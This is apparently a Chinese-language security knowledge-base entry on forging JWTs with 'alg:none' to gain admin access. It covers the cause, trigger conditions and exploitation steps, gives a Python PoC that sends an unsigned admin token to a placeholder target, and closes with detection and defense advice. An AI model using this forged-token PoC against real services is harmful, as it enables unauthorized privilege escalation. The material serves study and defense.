---
id: web-generic-jwt-alg-none-bypass
title: 服务端接受 alg:none 时无签名伪造 JWT 提权
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-alg-none-bypass
tags:
- jwt
- alg-none
- signature-bypass
- authentication
- privilege-escalation
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:37:19+08:00'
  notes: 已对照原文与图 05-06 核对：Flask 靶场 none_vuln 按 header.alg 决定是否验签、构造 Header.Payload. 空签名并把 role 改 admin 后返回 Welcome admin，均与原文一致；PoC 未在本机执行。
url: /docs/web/generic/jwt/web-generic-jwt-alg-none-bypass/
draft: false
kb_aliases:
- alg:none 绕过
- JWT 无签名伪造
- none 算法
- JWT 签名绕过
- 空签名 token
---

## 一句话结论

服务端把 JWT Header 中未经验证的 `alg` 当成验证方式，或 `algorithms` 白名单包含 `none` 时，攻击者可构造 `Header.Payload.`（签名为空）的令牌，把 `role` 改成 `admin` 直接通过认证。

## 原理

- JWT 规范允许 `"alg":"none"` 表示无签名，本意用于已被其他机制保证完整性的嵌套场景。
- 漏洞代码通常先 `get_unverified_header(token)` 读取 `alg`，再据此选择解码方式；当 `alg` 为 `none` 时调用 `jwt.decode(token, None, algorithms=["none"], options={"verify_signature": False})`，完全跳过签名校验。
- 因为 `alg` 来自攻击者可控的 Header，这等于把“是否验签”的决定权交给攻击者。Payload 是 Base64URL 明文，改 `role`/`sub` 后重新编码即可。
- 另一类成因是库的 `algorithms` 白名单显式包含 `none`，或旧版库默认接受 `none`。PyJWT 2.x 默认拒绝，但开发者显式配置或其他语言的旧库仍可能引入。

## 触发条件

- 服务端接受 `alg:none`，或根据 Header 的 `alg` 动态选择验证逻辑。
- JWT 用于认证/授权，Payload 中含 `role`、`sub`、`uid` 等可提权字段。
- 服务端没有对 `alg` 做固定白名单校验。

## 利用步骤

1. 获取一个普通用户的合法 JWT，Base64URL 解码 Header/Payload，确认算法与角色字段。
2. 把 Header 改为 `{"alg":"none","typ":"JWT"}`，Payload 改为目标身份（如 `{"sub":"admin","role":"admin"}`）。
3. 分别 Base64URL 编码，拼接为 `header.payload.`，末尾保留空签名段。
4. 以 `Authorization: Bearer <forged>` 访问受保护接口，确认返回管理员内容。

## PoC

```python
import base64, json, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}
token = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."

r = requests.get("http://target/api/whoami",
                 headers={"Authorization": f"Bearer {token}"})
print(r.status_code, r.text)
```

成功响应示例：`{"msg":"Welcome admin, role=admin"}`。

## 变体与关联

- 变体：`None`/`NONE` 大小写变体；空签名段带一个尾点或不带；与其他 Header 字段组合（`kid`、`jku`）测试。
- 关联：[[web-generic-jwt-rs256-hs256-confusion]]（算法字段被服务端信任的另一形态）；[[web-generic-jwt-weak-hmac-key-bruteforce]]（算法固定但密钥弱）。
- 边界：现代 JWT 库默认拒绝 `none`；若服务端固定 `algorithms=["HS256"]` 并校验 Header 算法一致，本手法不成立。

## 检测与防御

- 检测：JWT Header 中 `alg` 为 `none`/`None`；签名段为空；请求角色字段与账号基线不一致。
- 防御：解码时显式固定算法白名单且不含 `none`；校验 Header 的 `alg` 与配置一致；升级 JWT 库；不要在 Payload 中把 `role` 作为唯一授权依据，服务端按用户 ID 查角色。
